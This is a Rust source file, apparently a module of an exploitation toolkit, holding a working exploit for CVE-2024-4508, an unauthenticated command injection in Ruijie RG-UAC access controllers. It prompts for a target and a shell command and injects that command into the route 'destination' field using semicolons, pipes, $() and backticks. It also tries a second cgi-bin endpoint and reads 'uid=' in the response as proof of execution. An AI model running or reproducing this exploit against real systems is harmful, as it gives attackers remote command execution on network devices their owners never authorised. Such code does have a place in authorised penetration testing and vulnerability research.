use anyhow::Result;
use colored::*;
use reqwest::Client;
use std::time::Duration;
use crate::utils::{prompt_required, normalize_target, prompt_default};

/// Ruijie RG-UAC OS Command Injection (CVE-2024-4508)
/// 
/// Affects: RG-UAC (Unified Access Controller)
/// Critical command injection in static_route_edit_ipv6.php
/// CVSS: 9.8 (Critical) - Unauthenticated Remote Attack
/// Reference: VulDB / GitHub

const TIMEOUT_SECS: u64 = 10;

pub async fn run(target: &str) -> Result<()> {
    print_banner();
    
    let raw_target = if target.is_empty() {
        prompt_required("Target IP/URL")?
    } else {
        target.to_string()
    };
    
    let normalized = normalize_target(&raw_target)?;
    let base_url = if normalized.contains("://") {
        normalized.clone()
    } else {
        format!("http://{}", normalized)
    };
    
    println!("{} Target: {}", "[*]".blue(), base_url);
    
    let cmd = prompt_default("Command to execute", "id")?;
    
    let client = Client::builder()
        .danger_accept_invalid_certs(true)
        .timeout(Duration::from_secs(TIMEOUT_SECS))
        .build()?;
    
    // Vulnerability is in static_route_edit_ipv6.php
    // Command injection via route parameter manipulation
    let exploit_url = format!("{}/static_route_edit_ipv6.php", base_url.trim_end_matches('/'));
    
    println!("{} Testing command injection at {}...", "[*]".blue(), exploit_url);
    
    // Various injection payloads
    let injections = vec![
        format!(";{};", cmd),
        format!("|{}", cmd),
        format!("$({})", cmd),
        format!("`{}`", cmd),
    ];
    
    for injection in &injections {
        let payload = serde_json::json!({
            "action": "add",
            "destination": injection,
            "gateway": "fe80::1",
            "interface": "eth0"
        });
        
        println!("{} Trying injection: {} ...", "[*]".dimmed(), injection.chars().take(30).collect::<String>());
        
        match client.post(&exploit_url).json(&payload).send().await {
            Ok(resp) => {
                let status = resp.status();
                let text = resp.text().await.unwrap_or_default();
                
                if text.contains("uid=") || text.contains("root") {
                    println!("{} Command injection successful!", "[+]".green().bold());
                    println!("{} Output:", "[*]".blue());
                    for line in text.lines().take(15) {
                        println!("    {}", line);
                    }
                    println!("{} VULNERABLE to CVE-2024-4508!", "[VULN]".red().bold());
                    return Ok(());
                }
                
                if status.is_success() {
                    println!("{} HTTP {} - checking response...", "[*]".yellow(), status);
                }
            },
            Err(e) => {
                println!("{} Request failed: {}", "[-]".red(), e);
            }
        }
    }
    
    // Try alternate endpoint
    let alt_url = format!("{}/cgi-bin/cli.cgi", base_url.trim_end_matches('/'));
    println!("{} Trying alternate endpoint: {}", "[*]".blue(), alt_url);
    
    let alt_payload = format!("cmd=show%20version;{}", urlencoding::encode(&cmd));
    
    if let Ok(resp) = client.post(&alt_url)
        .header("Content-Type", "application/x-www-form-urlencoded")
        .body(alt_payload)
        .send()
        .await {
        let text = resp.text().await.unwrap_or_default();
        if !text.is_empty() {
            println!("{} Response: {}", "[*]".blue(), &text[..text.len().min(300)]);
        }
    }
    
    println!();
    println!("{} Could not confirm vulnerability.", "[*]".yellow());
    println!("{} Ensure target is running Ruijie RG-UAC.", "[*]".cyan());
    
    Ok(())
}

fn print_banner() {
    println!("{}", "╔═══════════════════════════════════════════════════════════╗".cyan());
    println!("{}", "║   Ruijie RG-UAC Command Injection (CVE-2024-4508)         ║".cyan());
    println!("{}", "╚═══════════════════════════════════════════════════════════╝".cyan());
}
